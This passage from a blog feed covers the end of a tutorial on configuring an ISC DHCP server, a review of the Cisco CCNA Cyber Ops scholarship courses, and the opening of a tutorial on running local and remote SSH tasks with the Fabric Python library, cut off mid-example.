<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># dhcpd.conf
</span><span class='line'>#
</span><span class='line'># Sample configuration file for ISC dhcpd
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'># option definitions common to all supported networks...
</span><span class='line'>option domain-name "example.org";
</span><span class='line'>option domain-name-servers ns1.example.org, ns2.example.org;
</span><span class='line'>
</span><span class='line'>default-lease-time 600;
</span><span class='line'>max-lease-time 7200;
</span><span class='line'>
</span><span class='line'># Use this to enble / disable dynamic dns updates globally.
</span><span class='line'>#ddns-update-style none;
</span><span class='line'>
</span><span class='line'># If this DHCP server is the official DHCP server for the local
</span><span class='line'># network, the authoritative directive should be uncommented.
</span><span class='line'>#authoritative;
</span><span class='line'>
</span><span class='line'># Use this to send dhcp log messages to a different log file (you also
</span><span class='line'># have to hack syslog.conf to complete the redirection).
</span><span class='line'>log-facility local7;
</span><span class='line'>
</span><span class='line'># No service will be given on this subnet, but declaring it helps the
</span><span class='line'># DHCP server to understand the network topology.
</span><span class='line'>
</span><span class='line'>subnet 10.152.187.0 netmask 255.255.255.0 {
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># This is a very basic subnet declaration.
</span><span class='line'>
</span><span class='line'>subnet 10.254.239.0 netmask 255.255.255.224 {
</span><span class='line'>  range 10.254.239.10 10.254.239.20;
</span><span class='line'>  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># This declaration allows BOOTP clients to get dynamic addresses,
</span><span class='line'># which we don't really recommend.
</span><span class='line'>
</span><span class='line'>subnet 10.254.239.32 netmask 255.255.255.224 {
</span><span class='line'>  range dynamic-bootp 10.254.239.40 10.254.239.60;
</span><span class='line'>  option broadcast-address 10.254.239.31;
</span><span class='line'>  option routers rtr-239-32-1.example.org;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># A slightly different configuration for an internal subnet.
</span><span class='line'>subnet 10.5.5.0 netmask 255.255.255.224 {
</span><span class='line'>  range 10.5.5.26 10.5.5.30;
</span><span class='line'>  option domain-name-servers ns1.internal.example.org;
</span><span class='line'>  option domain-name "internal.example.org";
</span><span class='line'>  option routers 10.5.5.1;
</span><span class='line'>  option broadcast-address 10.5.5.31;
</span><span class='line'>  default-lease-time 600;
</span><span class='line'>  max-lease-time 7200;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># Hosts which require special configuration options can be listed in
</span><span class='line'># host statements.   If no address is specified, the address will be
</span><span class='line'># allocated dynamically (if possible), but the host-specific information
</span><span class='line'># will still come from the host declaration.
</span><span class='line'>
</span><span class='line'>host passacaglia {
</span><span class='line'>  hardware ethernet 0:0:c0:5d:bd:95;
</span><span class='line'>  filename "vmunix.passacaglia";
</span><span class='line'>  server-name "toccata.fugue.com";
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># Fixed IP addresses can also be specified for hosts.   These addresses
</span><span class='line'># should not also be listed as being available for dynamic assignment.
</span><span class='line'># Hosts for which fixed IP addresses have been specified can boot using
</span><span class='line'># BOOTP or DHCP.   Hosts for which no fixed address is specified can only
</span><span class='line'># be booted with DHCP, unless there is an address range on the subnet
</span><span class='line'># to which a BOOTP client is connected which has the dynamic-bootp flag
</span><span class='line'># set.
</span><span class='line'>host fantasia {
</span><span class='line'>  hardware ethernet 08:00:07:26:c0:a5;
</span><span class='line'>  fixed-address fantasia.fugue.com;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'># You can declare a class of clients and then do address allocation
</span><span class='line'># based on that.   The example below shows a case where all clients
</span><span class='line'># in a certain class get addresses on the 10.17.224/24 subnet, and all
</span><span class='line'># other clients get addresses on the 10.0.29/24 subnet.
</span><span class='line'>
</span><span class='line'>class "foo" {
</span><span class='line'>  match if substring (option vendor-class-identifier, 0, 4) = "SUNW";
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>shared-network 224-29 {
</span><span class='line'>  subnet 10.17.224.0 netmask 255.255.255.0 {
</span><span class='line'>    option routers rtr-224.example.org;
</span><span class='line'>  }
</span><span class='line'>  subnet 10.0.29.0 netmask 255.255.255.0 {
</span><span class='line'>    option routers rtr-29.example.org;
</span><span class='line'>  }
</span><span class='line'>  pool {
</span><span class='line'>    allow members of "foo";
</span><span class='line'>    range 10.17.224.10 10.17.224.250;
</span><span class='line'>  }
</span><span class='line'>  pool {
</span><span class='line'>    deny members of "foo";
</span><span class='line'>    range 10.0.29.10 10.0.29.230;
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This is how the config file looks like. We&rsquo;ll use this example as a basis for making our own. Copy the example file and name it <strong>dhcpd.conf</strong> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf</span></code></pre></td></tr></table></div></figure>


<p>Now edit it and make changes according to your network:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># option definitions common to all supported networks...
</span><span class='line'>option domain-name "localdomain.com";
</span><span class='line'># DNS server address - look in your /etc/resolv.conf
</span><span class='line'>option domain-name-servers 192.168.217.2;
</span><span class='line'>
</span><span class='line'>default-lease-time 600;
</span><span class='line'>max-lease-time 7200;
</span><span class='line'>
</span><span class='line'># declare your subnet config
</span><span class='line'>subnet 192.168.217.0 netmask 255.255.255.0 {
</span><span class='line'>  # range of IPs to serve
</span><span class='line'>  range 192.168.217.10 192.168.217.20;
</span><span class='line'>  # the address of the routers - look for the gateway address in the route -n # command (entry containing UG)
</span><span class='line'>  option routers 192.168.217.2;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>host kaliclient {
</span><span class='line'>hardware ethernet 00:0c:29:22:f9:ae;
</span><span class='line'>fixed-address 192.168.217.12;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Here I declared the subnet for which the server would handle addresses, and I reserved an IP address for a client. For more options, you can look at the <code>dhcpd-options</code> man page.</p>

<p>Time to start the server. First, verify that the <code>/var/lib/dhcpd/dhcpd.leases</code> file exists, otherwise you will need to create an empty one before starting the server with the command <code>systemctl start dhcpd</code>. I changed my VMs connection settings to host-only, and then looked at the new IP configuration:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># ifconfig on the host running the DHCP server
</span><span class='line'>inet 192.168.217.10  netmask 255.255.255.0  broadcast 192.168.217.255
</span><span class='line'>
</span><span class='line'># ifconfig on the kali client
</span><span class='line'>inet 192.168.217.12  netmask 255.255.255.0  broadcast 192.168.217.255</span></code></pre></td></tr></table></div></figure>


<p>Success! Our DHCP server kicked in and gave addresses to 2 machines on the network!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ F.S. Fitzgerald to Hemingway:        \
</span><span class='line'>|                                      |
</span><span class='line'>| "Ernest, the rich are different from |
</span><span class='line'>| us." Hemingway:                      |
</span><span class='line'>|                                      |
</span><span class='line'>\ "Yes. They have more money."         /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CCNA Cyber Ops review]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/09/ccna-cyber-ops-review/"/>
    <updated>2017-04-09T03:11:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/09/ccna-cyber-ops-review</id>
    <content type="html"><![CDATA[<p>The Cisco Cybersecurity Scholarship program has concluded for the first cohort, and I have been fortunate enough to make it into the program! Now that the course and 2 exams are over, and I have a brand new certification, I thought I&rsquo;d share some info about what is covered in the CCNA Cyber Ops study materials.</p>

<!-- more -->


<p>First, I&rsquo;d like to thank Cisco for this amazing opportunity, and I wish more vendors would take their example. Yes, the latest exam price increase isn&rsquo;t nice, but this offering of a new certification&rsquo;s courses and exams to 10 000 people was an awesome move, especially for people who shared an interest in the security topics but wouldn&rsquo;t have gone to the certification path due to costs.</p>

<p>It also helped in bringing like-minded people together, creating communities and study groups over social media networks, and exchanging information about various security subjects.</p>

<p>So, what is this new CCNA that has the word &ldquo;cyber&rdquo; in it all about?</p>

<p><img class="center" src="http://chousensha.github.io/images/study/cyber.JPG" title="ccna cyber" alt="ccna cyber ops"></p>

<p>The certification aims to prepare people for working as security analysts in a Security Operations Center. This is a blue-team focused certification, and here are the skills that it covers:</p>

<p><img class="center" src="http://chousensha.github.io/images/study/skills.JPG" title="ccna cyber skills" alt="ccna cyber ops skills"></p>

<p>The scholarship consisted of 3 courses that had to be completed within 3 months, free vouchers for the 2 exams, and access to forums and mentors.</p>

<p><strong>Introduction to cybersecurity</strong></p>

<p>The first course was a very basic introductory course on what cybersecurity is and why it is needed. You can take it for free from Cisco&rsquo;s Networking Academy. This was a prerequisite for starting the other 2 courses that actually made up the certification part.</p>

<p><strong>Understanding Cisco cybersecurity fundamentals</strong></p>

<p>This second course was a blast! 14 sections, massive amount of material, both writen and videos, lots of information covered, I really enjoyed it! Some of it was review for me, but I also learned plenty of new things about DHCP relays, the CAPWAP protocol, the Security Onion suite, which is like the Kali of defensive security, and much more! The cryptograhpy section was excellently explained, and the Linux chapter might as well be a course in itself. Here&rsquo;s a list with some of the topics:</p>

<ul>
<li>networking stuff, protocols, attacks, devices</li>
<li>cryptography &ndash; detailed and easy to understand</li>
<li>general infosec concepts</li>
<li>web attacks</li>
<li>Windows and Linux sections with commands, filesystem structure, the ways the OS works, etc.</li>
<li>network and host security</li>
<li>various types of security devices and logs</li>
<li>different types of models that deal with threats</li>
</ul>


<p>A great addition to the study materials were the labs, where you could play with various OSes and tools in your browser, simulate attacks and react to different scenarios. It took a while for the labs to be initialized, but there were also walkthroughs for doing the lab, or skipping it altogether and following the steps instead.</p>

<p>You can find the exam topics for this course at <a href="https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secfnd/exam-topics">https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secfnd/exam-topics</a></p>

<p><strong>Implementing Cisco cybersecurity operations</strong></p>

<p>This course wasn&rsquo;t as big as the previous one, it had 13 sections and 2 appendices. It built up on the foundation of the other one, focusing on various aspects of incident response. It felt a bit rushed though, as it could have covered more material instead of breezing through, and the amount of typos that I found in it was pretty high. But overall, it was a good follow-up, and it had links for many resources where you could learn more. Some of the topics covered are:</p>

<ul>
<li>types of SOCs, NSM tools and data</li>
<li>incident analysis and threat hunting</li>
<li>CVSS scoring</li>
<li>data manipulation, correlation and normalization</li>
<li>incident detection and playbooks</li>
<li>incident response and automation</li>
</ul>


<p>The biggest problem that I faced before the exam was that the exam topics didn&rsquo;t follow the course content. Here is the exam guide: <a href="https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secops/exam-topics">https://learningnetwork.cisco.com/community/certifications/ccna-cyber-ops/secops/exam-topics</a></p>

<p>Fortunately, the mentors assigned to us were very helpful, and in addition to hosting webinars that reinforced the study material, they put together some documents that followed the exam blueprint and filled the gaps in information.</p>

<p>Overall, this has been a very interesting experience and I am happy to have participated in it! Again, hats off to Cisco for making this program available to security enthusiasts, and happy threat hunting!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ You worry too much about your job. Stop \
</span><span class='line'>\ it. You are not paid enough to worry.   /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Remote task automation with Fabric]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/03/remote-task-automation-with-fabric/"/>
    <updated>2017-04-03T03:01:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/03/remote-task-automation-with-fabric</id>
    <content type="html"><![CDATA[<p>Today I will go over the use of <a href="http://docs.fabfile.org/en/1.13/">Fabric</a>, a Python library and CLI tool for executing local / remote tasks via SSH.</p>

<p><strong>Requirements</strong>:</p>

<ul>
<li>Python 2.5 or 2.7</li>
<li>Paramiko</li>
<li>SSH</li>
</ul>


<p><strong>Features at a glance</strong>:</p>

<ul>
<li>run local or remote shell commands (also with the sudo option)</li>
<li>upload / download files</li>
<li>prompt for input</li>
<li>run Python functions</li>
<li>abort execution when encountering errors by default, but also allow for error handling</li>
</ul>


<p>Install Fabric with <code>pip install fabric</code></p>

<!-- more -->


<h2>Usage</h2>

<p>The way Fabric works is by creating a file named <code>fabfile.py</code>, containing some functions, and then using the <strong>fab</strong> CLI tool to run them.</p>

<p>Let&rsquo;s look at the options available with the <strong>fab</strong> tool:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab --help
</span><span class='line'>Usage: fab [options] &lt;command&gt;[:arg1,arg2=val2,host=foo,hosts='h1;h2',...] ...
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -d NAME, --display=NAME
</span><span class='line'>                        print detailed info about command NAME
</span><span class='line'>  -F FORMAT, --list-format=FORMAT
</span><span class='line'>                        formats --list, choices: short, normal, nested
</span><span class='line'>  -I, --initial-password-prompt
</span><span class='line'>                        Force password prompt up-front
</span><span class='line'>  --initial-sudo-password-prompt
</span><span class='line'>                        Force sudo password prompt up-front
</span><span class='line'>  -l, --list            print list of possible commands and exit
</span><span class='line'>  --set=KEY=VALUE,...   comma separated KEY=VALUE pairs to set Fab env vars
</span><span class='line'>  --shortlist           alias for -F short --list
</span><span class='line'>  -V, --version         show program's version number and exit
</span><span class='line'>  -a, --no_agent        don't use the running SSH agent
</span><span class='line'>  -A, --forward-agent   forward local agent to remote end
</span><span class='line'>  --abort-on-prompts    abort instead of prompting (for password, host, etc)
</span><span class='line'>  -c PATH, --config=PATH
</span><span class='line'>                        specify location of config file to use
</span><span class='line'>  --colorize-errors     Color error output
</span><span class='line'>  -D, --disable-known-hosts
</span><span class='line'>                        do not load user known_hosts file
</span><span class='line'>  -e, --eagerly-disconnect
</span><span class='line'>                        disconnect from hosts as soon as possible
</span><span class='line'>  -f PATH, --fabfile=PATH
</span><span class='line'>                        python module file to import, e.g. '../other.py'
</span><span class='line'>  -g HOST, --gateway=HOST
</span><span class='line'>                        gateway host to connect through
</span><span class='line'>  --gss-auth            Use GSS-API authentication
</span><span class='line'>  --gss-deleg           Delegate GSS-API client credentials or not
</span><span class='line'>  --gss-kex             Perform GSS-API Key Exchange and user authentication
</span><span class='line'>  --hide=LEVELS         comma-separated list of output levels to hide
</span><span class='line'>  -H HOSTS, --hosts=HOSTS
</span><span class='line'>                        comma-separated list of hosts to operate on
</span><span class='line'>  -i PATH               path to SSH private key file. May be repeated.
</span><span class='line'>  -k, --no-keys         don't load private key files from ~/.ssh/
</span><span class='line'>  --keepalive=N         enables a keepalive every N seconds
</span><span class='line'>  --linewise            print line-by-line instead of byte-by-byte
</span><span class='line'>  -n M, --connection-attempts=M
</span><span class='line'>                        make M attempts to connect before giving up
</span><span class='line'>  --no-pty              do not use pseudo-terminal in run/sudo
</span><span class='line'>  -p PASSWORD, --password=PASSWORD
</span><span class='line'>                        password for use with authentication and/or sudo
</span><span class='line'>  -P, --parallel        default to parallel execution method
</span><span class='line'>  --port=PORT           SSH connection port
</span><span class='line'>  -r, --reject-unknown-hosts
</span><span class='line'>                        reject unknown hosts
</span><span class='line'>  --sudo-password=SUDO_PASSWORD
</span><span class='line'>                        password for use with sudo only
</span><span class='line'>  --system-known-hosts=SYSTEM_KNOWN_HOSTS
</span><span class='line'>                        load system known_hosts file before reading user
</span><span class='line'>                        known_hosts
</span><span class='line'>  -R ROLES, --roles=ROLES
</span><span class='line'>                        comma-separated list of roles to operate on
</span><span class='line'>  -s SHELL, --shell=SHELL
</span><span class='line'>                        specify a new shell, defaults to '/bin/bash -l -c'
</span><span class='line'>  --show=LEVELS         comma-separated list of output levels to show
</span><span class='line'>  --skip-bad-hosts      skip over hosts that can't be reached
</span><span class='line'>  --skip-unknown-tasks  skip over unknown tasks
</span><span class='line'>  --ssh-config-path=PATH
</span><span class='line'>                        Path to SSH config file
</span><span class='line'>  -t N, --timeout=N     set connection timeout to N seconds
</span><span class='line'>  -T N, --command-timeout=N
</span><span class='line'>                        set remote command timeout to N seconds
</span><span class='line'>  -u USER, --user=USER  username to use when connecting to remote hosts
</span><span class='line'>  -w, --warn-only       warn, instead of abort, when commands fail
</span><span class='line'>  -x HOSTS, --exclude-hosts=HOSTS
</span><span class='line'>                        comma-separated list of hosts to exclude
</span><span class='line'>  -z INT, --pool-size=INT
</span><span class='line'>                        number of concurrent processes to use in parallel mode</span></code></pre></td></tr></table></div></figure>


<p>The <strong>fab</strong> tool can execute functions from a fabfile.py by passing the function name, like so: <code>fab func-name</code></p>

<h2>Examples</h2>

<p>Let&rsquo;s take a look at a couple of simple fabfiles, before making a more contrived one:</p>

<h3>Run commands on the local host</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">local_info</span><span class="p">():</span>
</span><span class='line'>        <span class="n">local</span><span class="p">(</span><span class="s">&#39;whoami&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab local_info            
</span><span class='line'>[localhost] local: whoami
</span><span class='line'>root
</span><span class='line'>
</span><span class='line'>Done.</span></code></pre></td></tr></table></div></figure>


<h3>Run commands on remote host &ndash; password authentication</h3>

<p>Next, let&rsquo;s use SSH with a password to log in to a remote host and do something on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;192.168.216.128&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;root&#39;</span> <span class="c"># default is the local user</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="s">&#39;password&#39;</span> <span class="c"># can be used both for SSH authentication and sudo</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@task</span>
</span><span class='line'><span class="k">def</span> <span class="nf">remote_info</span><span class="p">():</span>
</span><span class='line'>        <span class="n">run</span><span class="p">(</span><span class="s">&#39;uname -a&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fab remote_info 
</span><span class='line'>[192.168.216.128] Executing task 'remote_info'
</span><span class='line'>[192.168.216.128] run: uname -a
</span><span class='line'>[192.168.216.128] out: Linux localhost.localdomain 3.10.0-514.2.2.el7.x86_64 #1 SMP Tue Dec 6 23:06:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
</span><span class='line'>[192.168.216.128] out: 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Done.
</span><span class='line'>Disconnecting from 192.168.216.128... done.</span></code></pre></td></tr></table></div></figure>


<h3>Run commands on remote host &ndash; key authentication</h3>

<p>SSH with a password might be ok for demonstration purposes, but we will most likely want to use public key authentication. First, generate the key that we&rsquo;ll use later:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -b 2048 -v
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): mykey.pem
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in mykey.pem.
</span><span class='line'>Your public key has been saved in mykey.pem.pub.</span></code></pre></td></tr></table></div></figure>


<p>Next, copy the key to the remote host&rsquo;s <code>~/.ssh/authorized_keys</code> location:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-copy-id -i ~/mykey.pem.pub root@192.168.216.128 
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/root/mykey.pem.pub"
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
</span><span class='line'>root@192.168.216.128's password: 
</span><span class='line'>
</span><span class='line'>Number of key(s) added: 1
</span><span class='line'>
</span><span class='line'>Now try logging into the machine, with:   "ssh 'root@192.168.216.128'"
</span><span class='line'>and check to make sure that only the key(s) you wanted were added.</span></code></pre></td></tr></table></div></figure>


<p>Make the .pem key read-only and then try logging in by passing it to the ssh -i option:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod 400 mykey.pem
</span><span class='line'>ssh -i mykey.pem root@192.168.216.128
</span><span class='line'>Last failed login: Tue Mar 28 12:28:43 EEST 2017 from 192.168.216.1 on ssh:notty
</span><span class='line'>There were 2 failed login attempts since the last successful login.
</span><span class='line'>Last login: Tue Mar 28 11:30:19 2017 from 192.168.216.1
</span><span class='line'>[root@localhost ~]#</span></code></pre></td></tr></table></div></figure>


<p>Now add the key file in Fabric:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">fabric.api</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;192.168.217.131&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;root&#39;</span>
</span><span class='line'><span class="n">env</span><span class="o">.</span><span class="n">key_filename</span> <span class="o">=</span> <span class="s">&#39;~/.ssh/mykey.pem&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@task</span>
